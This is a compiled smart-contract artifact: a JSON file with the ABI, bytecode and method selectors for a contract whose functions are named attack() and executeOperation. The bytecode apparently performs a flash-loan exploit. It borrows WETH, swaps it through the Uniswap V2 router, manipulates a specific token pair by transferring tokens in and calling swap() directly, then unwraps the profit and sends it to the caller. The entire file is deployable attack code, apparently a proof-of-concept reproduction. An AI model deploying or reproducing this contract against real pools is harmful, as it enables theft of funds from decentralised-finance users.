{"abi":[{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executeOperation","inputs":[{"name":"asset","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"premium","type":"uint256","internalType":"uint256"},{"name":"initiator","type":"address","internalType":"address"},{"name":"params","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50610e5e8061001c5f395ff3fe60806040526004361061002b575f3560e01c80631b11d0ff146100365780639e5faafc14610069575f5ffd5b3661003257005b5f5ffd5b348015610041575f5ffd5b5061005561005036600461044e565b61007f565b604051901515815260200160405180910390f35b348015610074575f5ffd5b5061007d61022f565b005b5f5b604051632e1a7d4d60e01b81526801158e460913d00000600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290632e1a7d4d906024015f604051808303815f87803b1580156100d3575f5ffd5b505af11580156100e5573d5f5f3e3d5ffd5b505050506801158e460913d000006040516100ff90610426565b6040518091039082f0905080156101135760015b1561011e5750610081565b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26001600160a01b031663d0e30db06801158e460913d000006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610174575f5ffd5b505af1158015610186573d5f5f3e3d5ffd5b505060405163095ea7b360e01b815273c13e21b648a5ee794902342038ff3adab66be98760048201526801158e460913d00000602482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2935063095ea7b3925060440190506020604051808303815f875af11580156101fd573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061022191906104ef565b506001979650505050505050565b6040516310ac2ddf60e21b815230600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260248201526801158e460913d000006044820181905260a06064830152606060a48301527318775475f50557b96c63e8bbf7d75bfeb412082d60c483015273cc27779013a1cca68d3d93c640aac807891fd02960e48301526101048201525f608482015273c13e21b648a5ee794902342038ff3adab66be987906342b0b77c90610124015f604051808303815f87803b1580156102f2575f5ffd5b505af1158015610304573d5f5f3e3d5ffd5b50506040516370a0823160e01b81523060048201525f925073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc291506370a0823190602401602060405180830381865afa158015610357573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061037b9190610515565b604051632e1a7d4d60e01b81526004810182905290915073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290632e1a7d4d906024015f604051808303815f87803b1580156103c8575f5ffd5b505af11580156103da573d5f5f3e3d5ffd5b50506040513392508391505f81818185875af1925050503d805f811461041b576040519150601f19603f3d011682016040523d82523d5f602084013e610420565b606091505b50505050565b6108fc8061052d83390190565b80356001600160a01b0381168114610449575f5ffd5b919050565b5f5f5f5f5f5f60a08789031215610463575f5ffd5b61046c87610433565b9550602087013594506040870135935061048860608801610433565b9250608087013567ffffffffffffffff8111156104a3575f5ffd5b8701601f810189136104b3575f5ffd5b803567ffffffffffffffff8111156104c9575f5ffd5b8960208284010111156104da575f5ffd5b60208201935080925050509295509295509295565b5f602082840312156104ff575f5ffd5b8151801515811461050e575f5ffd5b9392505050565b5f60208284031215610525575f5ffd5b505191905056fe60806040819052630d0e30db60e41b81525f51602061089c5f395f51905f529063d0e30db0906801158e460913d00000906084905f906004818588803b158015610047575f5ffd5b505af1158015610059573d5f5f3e3d5ffd5b505060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f1960248201525f51602061089c5f395f51905f52935063095ea7b3925060440190506020604051808303815f875af11580156100c1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906100e591906106d9565b5060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f1960248201525f5160206108bc5f395f51905f529063095ea7b3906044016020604051808303815f875af1158015610148573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061016c91906106d9565b506040805160028082526060820183525f926020830190803683370190505090505f51602061089c5f395f51905f52815f815181106101ad576101ad6106ff565b60200260200101906001600160a01b031690816001600160a01b0316815250505f5160206108bc5f395f51905f52816001815181106101ee576101ee6106ff565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d90635c11d7959061024e906801158e460913d00000905f90869030904290600401610713565b5f604051808303815f87803b158015610265575f5ffd5b505af1158015610277573d5f5f3e3d5ffd5b50506040516370a0823160e01b81525f5160206108dc5f395f51905f5260048201525f92505f5160206108bc5f395f51905f5291506370a0823190602401602060405180830381865afa1580156102d0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102f49190610783565b60405163a9059cbb60e01b81525f5160206108dc5f395f51905f526004820152602481018290529091505f5160206108bc5f395f51905f529063a9059cbb906044016020604051808303815f875af1158015610352573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061037691906106d9565b505f5f5160206108dc5f395f51905f526001600160a01b0316630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156103c1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103e5919061079a565b90505f5f5f5160206108dc5f395f51905f526001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015610432573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061045691906107db565b506040516370a0823160e01b81525f5160206108dc5f395f51905f5260048201526001600160701b039283169450911691505f905f5160206108bc5f395f51905f52906370a0823190602401602060405180830381865afa1580156104bd573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104e19190610783565b90505f737a250d5630b4cf539739df2c5dacb4c659f2488d63054d50d46105088685610827565b6040516001600160e01b031960e084901b16815260048101919091526024810187905260448101869052606401602060405180830381865afa158015610550573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105749190610783565b60405163022c0d9f60e01b81525f60048201819052602482018390523060448301526080606483015260848201529091505f5160206108dc5f395f51905f529063022c0d9f9060a4015f604051808303815f87803b1580156105d4575f5ffd5b505af11580156105e6573d5f5f3e3d5ffd5b50506040516370a0823160e01b81523060048201525f92505f51602061089c5f395f51905f5291506370a0823190602401602060405180830381865afa158015610632573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106569190610783565b60405163a9059cbb60e01b8152336004820152602481018290529091505f51602061089c5f395f51905f529063a9059cbb906044016020604051808303815f875af11580156106a7573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106cb91906106d9565b50505050505050505061084c565b5f602082840312156106e9575f5ffd5b815180151581146106f8575f5ffd5b9392505050565b634e487b7160e01b5f52603260045260245ffd5b5f60a0820187835286602084015260a0604084015280865180835260c0850191506020880192505f5b818110156107635783516001600160a01b031683526020938401939092019160010161073c565b50506001600160a01b039590951660608401525050608001529392505050565b5f60208284031215610793575f5ffd5b5051919050565b5f602082840312156107aa575f5ffd5b81516001600160a01b03811681146106f8575f5ffd5b80516001600160701b03811681146107d6575f5ffd5b919050565b5f5f5f606084860312156107ed575f5ffd5b6107f6846107c0565b9250610804602085016107c0565b9150604084015163ffffffff8116811461081c575f5ffd5b809150509250925092565b8181038181111561084657634e487b7160e01b5f52601160045260245ffd5b92915050565b6044806108585f395ff3fe608060405236600a57005b5f5ffdfea2646970667358221220dfe7d65d01b645df97431f79ed4423a278cf12f91e682edec221325da142f2ba64736f6c634300081c0033000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000018775475f50557b96c63e8bbf7d75bfeb412082d000000000000000000000000cc27779013a1cca68d3d93c640aac807891fd029a2646970667358221220cb022d4e8dd961b5bac4362fb2539390bd067994cb63c6f4fa11983f2557fbba64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","executeOperation(address,uint256,uint256,address,bytes)":"1b11d0ff"},"id":546}